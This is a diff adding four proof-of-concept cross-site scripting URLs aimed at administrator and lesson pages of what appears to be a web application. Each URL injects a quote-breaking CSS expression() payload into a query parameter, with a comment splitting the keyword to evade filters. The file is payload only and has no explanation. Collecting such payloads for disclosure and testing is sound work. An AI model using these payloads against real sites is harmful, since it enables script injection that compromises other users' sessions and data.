@@ -1,0 +1,7 @@
+http://example.com/administrator.php?ctg=%22%20stYle=%22x:expre/**/ssion(alert(9))%20&user=admin&op=dashboard
+
+http://example.com/administrator.php?ctg=personal&user='%20stYle=x:expre/**/ssion(alert(9))%20ns='%20&op=dashboard
+
+http://example.com/administrator.php?ctg=calendar&view_calendar=%22%20stYle=x:expre/**/ssion(alert(9))%20ns=%22
+
+http://example.com/index.php?ctg=lesson_info&lessons_ID=2&course='%20stYle='x:expre/**/ssion(alert(9))
